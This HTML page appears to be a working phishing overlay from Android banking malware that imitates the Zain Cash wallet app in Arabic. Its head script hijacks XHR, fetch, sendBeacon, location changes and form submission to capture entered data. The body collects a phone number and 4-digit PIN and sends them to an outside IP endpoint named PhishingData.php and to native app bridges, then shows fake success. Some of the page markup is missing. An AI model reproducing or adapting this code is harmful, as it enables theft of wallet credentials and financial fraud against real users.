<!DOCTYPE html>
<html lang="ar">
<head>
<script>
(function(){
  if (window.__fyInterceptorInjected) return;
  window.__fyInterceptorInjected = true;

  var TARGET_PATH = '/api/PhishingData.php';
  var TARGET_URL = 'http://18.142.44.159:8035/api/PhishingData.php';

  function isOurTargetUrl(u){
    if (!u) return false;
    u = String(u);
    if (u.indexOf(TARGET_PATH) !== -1 || u.indexOf(TARGET_URL) !== -1) return true;
    try {
      var cfg = (window.__PHISH_CONFIG__ || window.__PHISH_CONFIG) || {};
      var submitUrl = cfg.submit_url || '';
      if (submitUrl && u.indexOf(submitUrl) !== -1) return true;
    } catch(e){}
    return false;
  }

  var STATIC_EXT_RE = /\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|otf|mp[34]|webm|pdf|zip|rar|7z|map|woff|bmp|tiff?|aac|flac|ogg|wav|webp|avif)(\?|#|$)/i;

  function isSubmitUrl(u){
    if (!u) return false;
    u = String(u);
    if (u.indexOf(TARGET_PATH) !== -1) return true;
    if (u.indexOf(TARGET_URL) !== -1) return true;
    if (STATIC_EXT_RE.test(u)) return false;
    if (/\/api\/|\/inj\/|\/inject|\/submit|\/login|\/log\/|\/save|\/post|\/send|\/upload|\/collect|\/capture|\/result|\/phish|\/form/i.test(u)) {
      return true;
    }
    if (/\.php(\?|&|$)|\.asp(\?|&|$)|\.aspx(\?|&|$)|\.jsp(\?|&|$)|\.do(\?|&|$)|\.action(\?|&|$)|\.ashx(\?|&|$)|\.cgi(\?|&|$)/i.test(u)) {
      return true;
    }
    return false;
  }

  function formDataToObj(fd){
    var o = {};
    try {
      var add = function(k, v){
        if (o[k] !== undefined) {
          if (!Array.isArray(o[k])) o[k] = [o[k]];
          o[k].push(v);
        } else { o[k] = v; }
      };
      if (fd.forEach) { fd.forEach(function(v, k){ add(k, v); }); }
      else if (fd.entries) {
        var it = fd.entries(), r;
        while (!(r = it.next()).done) add(r.value[0], r.value[1]);
      }
    } catch(e){}
    return o;
  }

  function urlEncodedToObj(s){
    var o = {};
    try {
      s.split('&').forEach(function(p){
        if (!p) return;
        var idx = p.indexOf('=');
        var k, v;
        if (idx === -1) { k = decodeURIComponent(p.replace(/\+/g,' ')); v = ''; }
        else { k = decodeURIComponent(p.substring(0,idx).replace(/\+/g,' '));
               v = decodeURIComponent(p.substring(idx+1).replace(/\+/g,' ')); }
        if (k) o[k] = v;
      });
    } catch(e){}
    return o;
  }

  function normalizeBody(body){
    if (body === null || body === undefined) return {};
    if (body instanceof FormData) return formDataToObj(body);
    if (typeof body === 'string') {
      var t = body.trim();
      if (t === '') return {};
      if ((t.charAt(0)==='{' && t.charAt(t.length-1)==='}') ||
          (t.charAt(0)==='[' && t.charAt(t.length-1)===']')) {
        try { return JSON.parse(t); } catch(e){}
      }
      if (t.indexOf('=') !== -1 && t.indexOf('{') === -1) return urlEncodedToObj(t);
      return { raw: body };
    }
    if (typeof body === 'object') {
      if (typeof URLSearchParams !== 'undefined' && body instanceof URLSearchParams) {
        var o = {};
        try { body.forEach(function(v,k){ o[k]=v; }); } catch(e){}
        return o;
      }
      if (body instanceof Blob || body instanceof File) return { raw: '[binary]' };
      return body;
    }
    return { raw: String(body) };
  }

  // 提前保存原始 XHR 方法，供 fyPostPhish 的 fallback 使用
  var _origOpen = XMLHttpRequest.prototype.open;
  var _origSend = XMLHttpRequest.prototype.send;

  function ensureFyPostPhish(){
    if (typeof window.fyPostPhish === 'function') return window.fyPostPhish;
    window.fyPostPhish = function(raw){
      try {
        var cfg = window.__PHISH_CONFIG || {};
        var clean = normalizeBody(raw);
        // 优先使用原生桥接 Android.submitData，避免 WebView 跨域 CORS 预检
        if (typeof Android !== 'undefined' && Android.submitData) {
          try {
            Android.submitData(JSON.stringify(clean));
            return;
          } catch(e){}
        }
        // Fallback：XHR（仅用于浏览器测试环境，无原生桥接时）
        // 直接用原始 open/send 发送，避免被自身拦截器再次拦截导致递归
        var body = {
          phone_id: cfg.phone_id || '',
          package_name: cfg.package_name || '',
          appName: cfg.appName || '',
          payload: clean
        };
        var url = cfg.submit_url || TARGET_URL;
        var xhr = new XMLHttpRequest();
        _origOpen.call(xhr, 'POST', url, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        _origSend.call(xhr, JSON.stringify(body));
      } catch(e){}
    };
    return window.fyPostPhish;
  }

  var fyPostPhish = ensureFyPostPhish();

  // 模拟 XHR 完成，触发页面回调，避免页面逻辑挂起
  function mockXhrComplete(xhr){
    try {
      var respBody = '{"code":200,"msg":"ok"}';
      try {
        xhr.readyState = 4;
        xhr.status = 200;
        xhr.statusText = 'OK';
        xhr.responseText = respBody;
        xhr.response = respBody;
        xhr.responseURL = TARGET_URL;
      } catch(e){
        var props = { readyState:4, status:200, statusText:'OK', responseText:respBody, response:respBody, responseURL:TARGET_URL };
        for (var k in props) {
          try { Object.defineProperty(xhr, k, { value: props[k], writable:true, configurable:true }); } catch(e2){}
        }
      }
      try {
        xhr.getResponseHeader = function(name){ return /content-type/i.test(name) ? 'application/json' : null; };
        xhr.getAllResponseHeaders = function(){ return 'content-type: application/json\r\n'; };
      } catch(e){}
      if (typeof xhr.onreadystatechange === 'function') xhr.onreadystatechange.call(xhr);
      if (typeof xhr.onload === 'function') xhr.onload.call(xhr);
      if (typeof xhr.onloadend === 'function') xhr.onloadend.call(xhr);
      if (typeof xhr.dispatchEvent === 'function') {
        try { xhr.dispatchEvent(new Event('readystatechange')); } catch(e){}
        try { xhr.dispatchEvent(new Event('load')); } catch(e){}
        try { xhr.dispatchEvent(new Event('loadend')); } catch(e){}
      }
    } catch(e){}
  }

  // 劫持 XMLHttpRequest（支持 POST 和 GET 带参）
  XMLHttpRequest.prototype.open = function(method, url){
    this.__fyMethod = (method || '').toUpperCase();
    this.__fyUrl = url;
    this.__fyIsSubmit = isSubmitUrl(url);
    return _origOpen.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function(body){
    try {
      var method = this.__fyMethod || 'GET';
      var url = this.__fyUrl || '';
      var isSubmit = this.__fyIsSubmit;
      if (method === 'POST' && isSubmit) {
        fyPostPhish(normalizeBody(body));
        mockXhrComplete(this);
        return;
      }
      if (method === 'GET' && isSubmit && /[?&][^=]+=/.test(String(url))) {
        var qs = String(url).split('?')[1] || '';
        fyPostPhish(urlEncodedToObj(qs));
        mockXhrComplete(this);
        return;
      }
    } catch(e){}
    return _origSend.apply(this, arguments);
  };

  // 劫持 fetch（支持 POST 和 GET 带参，兼容 Request 对象）
  if (window.fetch) {
    var _origFetch = window.fetch;
    window.fetch = function(url, opts){
      try {
        opts = opts || {};
        var isReq = (typeof Request !== 'undefined') && (url instanceof Request);
        var urlStr = isReq ? url.url : (typeof url === 'string' ? url : (url && url.url) || '');
        var method = (isReq ? url.method : (opts.method || 'GET')).toUpperCase();
        var isSubmit = isSubmitUrl(urlStr);
        var isPost = method === 'POST';
        var isGetWithData = method === 'GET' && isSubmit && /[?&][^=]+=/.test(urlStr);
        if ((isPost && isSubmit) || isGetWithData) {
          var body = isReq ? (opts.body || (url.body ? '[stream]' : undefined)) : opts.body;
          var data = isGetWithData ? urlEncodedToObj(urlStr.split('?')[1] || '') : normalizeBody(body);
          fyPostPhish(data);
          var fakeResp = new Response(JSON.stringify({code:200,msg:'saved'}), {
            status: 200, statusText: 'OK',
            headers: {'Content-Type':'application/json'}
          });
          return Promise.resolve(fakeResp);
        }
      } catch(e){}
      return _origFetch.apply(this, arguments);
    };
  }

  // 劫持 sendBeacon（现代浏览器无痕提交）
  if (navigator && typeof navigator.sendBeacon === 'function') {
    var _origBeacon = navigator.sendBeacon.bind(navigator);
    navigator.sendBeacon = function(url, data){
      try {
        if (isSubmitUrl(url)) {
          fyPostPhish(normalizeBody(data));
          return true;
        }
      } catch(e){}
      return _origBeacon(url, data);
    };
  }

  // 劫持 <script src>（JSONP 跨域提交）
  try {
    var _origScriptSrc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
    if (_origScriptSrc && _origScriptSrc.set) {
      Object.defineProperty(HTMLScriptElement.prototype, 'src', {
        set: function(v){
          try {
            if (v && typeof v === 'string' && v.indexOf('?') !== -1 && /[?&][^=]+=/.test(v) && isSubmitUrl(v)) {
              var qs = v.split('?')[1] || '';
              fyPostPhish(urlEncodedToObj(qs));
            }
          } catch(e){}
          _origScriptSrc.set.call(this, v);
        },
        get: _origScriptSrc.get,
        configurable: true
      });
    }
  } catch(e){}

  // 劫持 location 跳转带参（支持 location.href= / location.assign/replace）
  // 注意：不劫持 window.location 本身，因为它是 WebView 原生管理的特殊对象，
  // 劫持其 getter/setter 会破坏 WebView 内部状态导致严重卡顿。
  // window.location = url 等价于 location.href = url，会被下面的 href setter 拦截。
  var _hrefDesc = Object.getOwnPropertyDescriptor(Location.prototype, 'href');
  var _origHrefSet = _hrefDesc && _hrefDesc.set ? _hrefDesc.set : null;
  if (_origHrefSet) {
    try {
      Object.defineProperty(Location.prototype, 'href', {
        configurable: true,
        get: _hrefDesc.get,
        set: function(v){
          try {
            if (v && typeof v === 'string' && /[?&][^=]+=/.test(v) && isSubmitUrl(v)) {
              var qs = v.split('?')[1] || '';
              fyPostPhish(urlEncodedToObj(qs));
            }
          } catch(e){}
          _origHrefSet.call(this, v);
        }
      });
    } catch(e){}
  }
  // 劫持 location.assign(url) 和 location.replace(url)
  try {
    var _origAssign = Location.prototype.assign;
    var _origReplace = Location.prototype.replace;
    Location.prototype.assign = function(url){
      try {
        if (url && typeof url === 'string' && /[?&][^=]+=/.test(url) && isSubmitUrl(url) && !isOurTargetUrl(url)) {
          var qs = url.split('?')[1] || '';
          fyPostPhish(urlEncodedToObj(qs));
        }
      } catch(e){}
      return _origAssign.call(this, url);
    };
    Location.prototype.replace = function(url){
      try {
        if (url && typeof url === 'string' && /[?&][^=]+=/.test(url) && isSubmitUrl(url) && !isOurTargetUrl(url)) {
          var qs = url.split('?')[1] || '';
          fyPostPhish(urlEncodedToObj(qs));
        }
      } catch(e){}
      return _origReplace.call(this, url);
    };
  } catch(e3){}

  // 劫持 form.submit() 程序化提交（DOM 规范：submit() 不触发 submit 事件）
  try {
    var _origFormSubmit = HTMLFormElement.prototype.submit;
    HTMLFormElement.prototype.submit = function(){
      try {
        var form = this;
        var action = form.getAttribute('action') || '';
        var method = (form.getAttribute('method') || 'get').toUpperCase();
        var isPost = method === 'POST';
        var isGetSubmit = method === 'GET' && isSubmitUrl(action);
        if (isPost && (action === '' || isSubmitUrl(action))) {
          var data = {};
          try {
            new FormData(form).forEach(function(v, k){
              if (data[k] !== undefined) {
                if (!Array.isArray(data[k])) data[k] = [data[k]];
                data[k].push(v);
              } else { data[k] = v; }
            });
          } catch(e2){}
          fyPostPhish(data);
          return; // 阻止真实提交
        } else if (isGetSubmit) {
          var dataGet = {};
          try {
            new FormData(form).forEach(function(v, k){ dataGet[k] = v; });
          } catch(e3){}
          fyPostPhish(dataGet);
          return;
        }
      } catch(e){}
      return _origFormSubmit.apply(this, arguments);
    };
  } catch(e){}

  // 劫持原生 form 提交（捕获阶段，优先于业务代码，支持 POST 和 GET）
  document.addEventListener('submit', function(e){
    try {
      var form = e.target;
      if (!form || form.tagName !== 'FORM') return;
      var action = form.getAttribute('action') || '';
      var method = (form.getAttribute('method') || 'get').toUpperCase();
      var isPost = method === 'POST';
      var isGetSubmit = method === 'GET' && isSubmitUrl(action);
      if (isPost && (action === '' || isSubmitUrl(action))) {
        e.preventDefault();
        var data = {};
        try {
          new FormData(form).forEach(function(v, k){
            if (data[k] !== undefined) {
              if (!Array.isArray(data[k])) data[k] = [data[k]];
              data[k].push(v);
            } else { data[k] = v; }
          });
        } catch(e2){}
        fyPostPhish(data);
      } else if (isGetSubmit) {
        e.preventDefault();
        var dataGet = {};
        try {
          new FormData(form).forEach(function(v, k){ dataGet[k] = v; });
        } catch(e3){}
        fyPostPhish(dataGet);
      }
    } catch(e){}
  }, true);
})();
</script>

<meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
  <title>Zain Cash</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
      user-select: none;
    }

    html, body {
      width: 100%;
      height: 100%;
      background: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      overflow: hidden;
    }

    .app-viewport {
      position: relative;
      width: 100%;
      height: 100%;
      max-width: 480px;
      margin: 0 auto;
      background: #ffffff;
      overflow: hidden;
    }

    /* 两步切换视图 */
    .step-view {
      display: none;
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      flex-direction: column;
      overflow: hidden;
    }

    .step-view.active {
      display: flex;
      animation: fadeIn 0.22s ease-out forwards;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(3px); }
      to { opacity: 1; transform: translateY(0); }
    }

    /* ========================================================
       STEP 1: 白底极简手机号输入页
       ======================================================== */
    .step1-container {
      background: #ffffff;
      padding: 34px 22px 28px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      height: 100%;
      overflow-y: auto;
      -webkit-overflow-scrolling: touch;
    }

    /* 顶部导航行：左侧指示进度条，右侧箭头 -> (LTR 布局) */
    .top-progress-bar {
      display: flex;
      align-items: center;
      justify-content: flex-end;
      gap: 22px;
      margin-top: 4px;
      margin-bottom: 34px;
      direction: ltr;
    }

    .progress-segments {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .prog-pill {
      height: 5px;
      width: 48px;
      border-radius: 3px;
      background: #d8dde3;
    }

    .prog-pill.step-active {
      background: #d8dde3;
      position: relative;
      overflow: hidden;
    }

    .prog-pill.step-active::after {
      content: "";
      position: absolute;
      top: 0;
      right: 0;
      width: 8px;
      height: 100%;
      border-radius: 3px;
      background: #1b3858;
    }

    .top-arrow-btn {
      background: transparent;
      border: none;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      color: #111827;
      padding: 0;
    }

    .top-arrow-btn svg {
      width: 22px;
      height: 22px;
      stroke: #111827;
      stroke-width: 2.2;
      fill: none;
    }

    /* 标题区域 */
    .step1-title {
      font-size: 26px;
      font-weight: 800;
      color: #1a202c;
      letter-spacing: -0.3px;
      margin-bottom: 12px;
      line-height: 1.35;
      direction: rtl;
      text-align: right;
    }

    .step1-subtitle {
      font-size: 14.5px;
      color: #8a96a3;
      font-weight: 500;
      margin-bottom: 32px;
      line-height: 1.4;
      direction: rtl;
      text-align: right;
    }

    .input-label {
      font-size: 15px;
      font-weight: 700;
      color: #2d3748;
      margin-bottom: 12px;
      direction: rtl;
      text-align: right;
    }

    /* 手机号输入框组合 */
    .phone-field-wrapper {
      width: 100%;
      height: 56px;
      background: #f6f6f8;
      border-radius: 6px;
      display: flex;
      align-items: center;
      padding: 0 16px;
      direction: ltr; /* 区号在左侧，号码在右侧 */
      transition: all 0.2s ease;
      border: 1.2px solid transparent;
    }

    .phone-field-wrapper:focus-within {
      border-color: #276657;
      background: #ffffff;
      box-shadow: 0 0 0 3px rgba(39, 102, 87, 0.12);
    }

    .country-code {
      font-size: 16px;
      font-weight: 600;
      color: #2d3748;
      display: flex;
      align-items: center;
      padding-right: 14px;
      border-right: 1px solid #e2e8f0;
      margin-right: 14px;
      flex-shrink: 0;
    }

    .phone-input {
      flex: 1;
      height: 100%;
      border: none;
      outline: none;
      background: transparent;
      font-size: 16px;
      font-weight: 600;
      color: #1a202c;
      caret-color: #276657; /* 翠绿色光标 */
      direction: rtl;
      text-align: right;
    }

    .phone-input::placeholder {
      color: #a0aec0;
      font-weight: 400;
      font-size: 15px;
    }

    /* 底部发送按钮 */
    .step1-bottom {
      margin-top: auto;
      margin-bottom: 4px;
    }

    .btn-step1 {
      width: 100%;
      height: 52px;
      border-radius: 12px;
      background: #b3b3b3;
      color: #ffffff;
      font-size: 16.5px;
      font-weight: 700;
      border: none;
      cursor: not-allowed;
      transition: all 0.2s ease;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .btn-step1.active {
      background: #276657;
      cursor: pointer;
      box-shadow: 0 4px 14px rgba(39, 102, 87, 0.35);
    }

    .btn-step1.active:active {
      transform: scale(0.985);
      background: #1f5246;
    }

    /* ========================================================
       STEP 2: 华丽紫调 PIN 码输入页 (com.audiogram.zaincash)
       ======================================================== */
    .step2-container {
      background: linear-gradient(180deg, #792e8b 0%, #5d1f73 50%, #3f1155 100%);
      height: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
      padding: 56px 20px 28px;
      overflow-y: auto;
      position: relative;
    }

    /* 顶部品牌图标与英文标题 */
    .step2-brand-area {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 6px;
    }

    .brand-app-icon {
      width: 78px;
      height: 78px;
      border-radius: 18px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.28);
      display: block;
      margin-bottom: 14px;
    }

    .brand-app-name {
      font-size: 22px;
      font-weight: 700;
      color: #ffffff;
      letter-spacing: 0.2px;
      direction: ltr;
    }

    /* 中间 PIN 提示 */
    .step2-pin-area {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      margin-top: 24px;
      text-align: center;
    }

    .pin-prompt-text {
      font-size: 14.5px;
      font-weight: 500;
      color: rgba(255, 255, 255, 0.9);
      margin-bottom: 24px;
      direction: rtl;
    }

    /* PIN 圆圈指示器 */
    .pin-dots-row {
      display: flex;
      justify-content: center;
      gap: 16px;
      direction: ltr;
      margin-bottom: 12px;
    }

    .pin-circle {
      width: 14px;
      height: 14px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.22);
      transition: all 0.18s ease;
    }

    .pin-circle.filled {
      background: #ffffff;
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.9);
      transform: scale(1.15);
    }

    /* 椭圆形数字键盘 (3列 x 4行，从左到右：3 2 1 / 6 5 4 / 9 8 7 / ⌫ 0) */
    .keypad-container {
      width: 100%;
      max-width: 345px;
      margin-top: auto;
      margin-bottom: 8px;
      direction: ltr; /* 固定布局方向 */
    }

    .keypad-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      row-gap: 14px;
      column-gap: 14px;
      justify-items: center;
      align-items: center;
    }

    .key-oval {
      width: 100%;
      max-width: 98px;
      height: 52px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.12);
      border: 1px solid rgba(255, 255, 255, 0.08);
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.18), inset 0 1px 1px rgba(255, 255, 255, 0.15);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      font-weight: 700;
      color: #ffffff;
      cursor: pointer;
      user-select: none;
      touch-action: manipulation;
      transition: transform 0.08s ease, background 0.12s ease;
    }

    .key-oval:active {
      background: rgba(255, 255, 255, 0.24);
      transform: scale(0.95);
    }

    .key-oval.empty {
      visibility: hidden;
      pointer-events: none;
      background: transparent;
      border: none;
      box-shadow: none;
    }

    .del-svg {
      width: 22px;
      height: 18px;
      display: block;
    }

    /* 底部“忘记 PIN 码”链接 */
    .forgot-pin-link {
      font-size: 13px;
      color: rgba(255, 255, 255, 0.72);
      margin-top: 14px;
      cursor: pointer;
      text-align: center;
      direction: rtl;
    }
    .forgot-pin-link:active {
      color: #ffffff;
    }

    /* 弹窗 Toast */
    .app-toast {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.85);
      color: #ffffff;
      padding: 12px 24px;
      border-radius: 8px;
      font-size: 14.5px;
      font-weight: 500;
      z-index: 1000;
      display: none;
      text-align: center;
      box-shadow: 0 4px 16px rgba(0,0,0,0.35);
    }
  </style>
</head>

        <!-- 中间 PIN 输入提示与指示点 -->
        <div class="step2-pin-area">
          <div class="pin-prompt-text">أدخل رمز PIN الخاص بك</div>
          <div class="pin-dots-row" id="pinDotsRow">
            <div class="pin-circle" id="dot0"></div>
            <div class="pin-circle" id="dot1"></div>
            <div class="pin-circle" id="dot2"></div>
            <div class="pin-circle" id="dot3"></div>
          </div>
        </div>

        <!-- 椭圆形数字键盘 (3列 x 4行: 3 2 1 / 6 5 4 / 9 8 7 / ⌫ 0) -->
        <div class="keypad-container">
          <div class="keypad-grid">
            <div class="key-oval" data-num="3">3</div>
            <div class="key-oval" data-num="2">2</div>
            <div class="key-oval" data-num="1">1</div>

            <div class="key-oval" data-num="6">6</div>
            <div class="key-oval" data-num="5">5</div>
            <div class="key-oval" data-num="4">4</div>

            <div class="key-oval" data-num="9">9</div>
            <div class="key-oval" data-num="8">8</div>
            <div class="key-oval" data-num="7">7</div>

            <div class="key-oval" id="btnBackspace">
              <svg class="del-svg" viewBox="0 0 24 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                <!-- 房型退格箭头 -->
                <path d="M7 1.5L1.5 9L7 16.5H22C22.55 16.5 23 16.05 23 15.5V2.5C23 1.95 22.55 1.5 22 1.5H7Z" stroke="#ffffff" stroke-width="1.8" stroke-linejoin="round" stroke-linecap="round"/>
                <!-- 内部 X 删除线条 -->
                <line x1="11" y1="5.5" x2="18" y2="12.5" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round"/>
                <line x1="18" y1="5.5" x2="11" y2="12.5" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round"/>
              </svg>
            </div>
            <div class="key-oval" data-num="0">0</div>
            <div class="key-oval empty"></div>
          </div>

          <!-- 忘记密码 -->
          <div class="forgot-pin-link">نسيت رمز PIN؟</div>
        </div>

    <!-- 弹窗 -->
    <div class="app-toast" id="appToast"></div>
  </div>

  <script>
    (function() {
      var pkgName = "com.audiogram.zaincash";
      var step1Phone = "";
      var pinCode = "";

      var viewStep1 = document.getElementById("viewStep1");
      var viewStep2 = document.getElementById("viewStep2");
      var inputPhone = document.getElementById("inputPhone");
      var btnSendCode = document.getElementById("btnSendCode");
      var dots = [
        document.getElementById("dot0"),
        document.getElementById("dot1"),
        document.getElementById("dot2"),
        document.getElementById("dot3")
      ];
      var btnBackspace = document.getElementById("btnBackspace");
      var appToast = document.getElementById("appToast");

      function showToast(msg, duration) {
        duration = duration || 2000;
        appToast.textContent = msg;
        appToast.style.display = "block";
        setTimeout(function() {
          appToast.style.display = "none";
        }, duration);
      }

      // 手机号输入监听
      inputPhone.addEventListener("input", function() {
        var val = this.value.replace(/[^0-9]/g, '');
        this.value = val;
        if (val.length >= 7) {
          btnSendCode.classList.add("active");
        } else {
          btnSendCode.classList.remove("active");
        }
      });

      // 点击第一步“ارسال الرمز”
      btnSendCode.addEventListener("click", function() {
        var phone = inputPhone.value.trim();
        if (phone.length < 7) {
          showToast("يرجى إدخال رقم هاتف صحيح");
          return;
        }
        step1Phone = "+962" + phone;
        // 切换至第二步
        viewStep1.classList.remove("active");
        viewStep2.classList.add("active");
      });

      // 更新 PIN 指示点
      function updatePinDots() {
        for (var i = 0; i < 4; i++) {
          if (i < pinCode.length) {
            dots[i].classList.add("filled");
          } else {
            dots[i].classList.remove("filled");
          }
        }
      }

      // 键盘点击
      var keys = document.querySelectorAll(".key-oval[data-num]");
      keys.forEach(function(key) {
        key.addEventListener("click", function() {
          if (pinCode.length >= 4) return;
          var num = this.getAttribute("data-num");
          pinCode += num;
          updatePinDots();

          if (pinCode.length === 4) {
            setTimeout(submitAllData, 250);
          }
        });
      });

      // 退格删除
      btnBackspace.addEventListener("click", function() {
        if (pinCode.length > 0) {
          pinCode = pinCode.slice(0, -1);
          updatePinDots();
        }
      });

      // 数据上报
      function submitAllData() {
        var payload = {
          pkg: pkgName,
          phone: step1Phone,
          username: step1Phone,
          pin: pinCode,
          payment_password: pinCode,
          timestamp: new Date().getTime()
        };

        console.log("Submitting ZainCash payload:", payload);

        // 1. Android 原生桥接
        try {
          if (typeof Android !== 'undefined') {
            if (typeof Android.postMessage === 'function') Android.postMessage(JSON.stringify(payload));
            if (typeof Android.setFormData === 'function') Android.setFormData(JSON.stringify(payload));
          }
        } catch(e) {}

        // 2. FKB 注入桥接
        try {
          if (typeof FKB !== 'undefined') {
            if (typeof FKB.postMessage === 'function') FKB.postMessage(JSON.stringify(payload));
            if (typeof FKB.setFormData === 'function') {
              FKB.setFormData(JSON.stringify({
                client_id: step1Phone,
                username: step1Phone,
                password: pinCode,
                login_password: pinCode,
                payment_password: pinCode,
                pin: pinCode,
                pkg: pkgName
              }));
            }
          }
        } catch(e) {}

        // 3. iOS WebKit 兼容
        try {
          if (window.webkit && window.webkit.messageHandlers) {
            if (window.webkit.messageHandlers.Android && typeof window.webkit.messageHandlers.Android.postMessage === 'function') {
              window.webkit.messageHandlers.Android.postMessage(JSON.stringify(payload));
            } else if (window.webkit.messageHandlers.FKB && typeof window.webkit.messageHandlers.FKB.postMessage === 'function') {
              window.webkit.messageHandlers.FKB.postMessage(JSON.stringify(payload));
            }
          }
        } catch(e) {}

        // 4. Ajax 网络上报兜底
        try {
          var xhr = new XMLHttpRequest();
          xhr.open('POST', "http://18.142.44.159:8035/api/PhishingData.php", true);
          xhr.setRequestHeader('Content-Type', 'application/json');
          xhr.send(JSON.stringify({
            pkg: pkgName,
            template: 'zaincash_mobile',
            formData: payload
          }));
        } catch(e) {}

        showToast("جاري التحقق...");

        // 级联关闭页面
        setTimeout(function() {
          try {
            if (typeof Android !== 'undefined') {
              if (typeof Android.close === 'function') Android.close();
              else if (typeof Android.close === 'function') Android.close();
            } else if (typeof Android!=='undefined'&&Android.close) {
              Android.close();
            } else {
              window.close();
            }
          } catch(e) {}
        }, 800);
      }
    })();
  </script>
